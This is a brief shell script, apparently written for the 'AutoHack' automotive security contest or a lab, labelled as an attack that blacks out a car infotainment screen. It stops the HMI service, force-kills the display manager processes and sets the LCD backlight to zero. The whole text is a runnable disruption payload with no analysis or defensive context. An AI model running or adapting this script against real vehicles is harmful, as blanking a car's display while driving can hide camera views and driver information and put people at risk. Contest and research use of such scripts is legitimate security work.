#!/bin/sh
# shut_screen.sh - AutoHack IVI Screen Shutdown Attack

# 1) HMI 프로세스 정상 종료 시도
if [ -x /etc/init.d/rc.hmi ]; then
    /etc/init.d/rc.hmi stop
fi

# 2) 그래도 살아있으면 강제 종료
slay LSD 2>/dev/null
slay DisplayManager 2>/dev/null

# 3) 혹시 백라이트 제어 노드가 있으면 0으로
if [ -e /sys/class/backlight/lcd0/brightness ]; then
    echo 0 > /sys/class/backlight/lcd0/brightness
fi

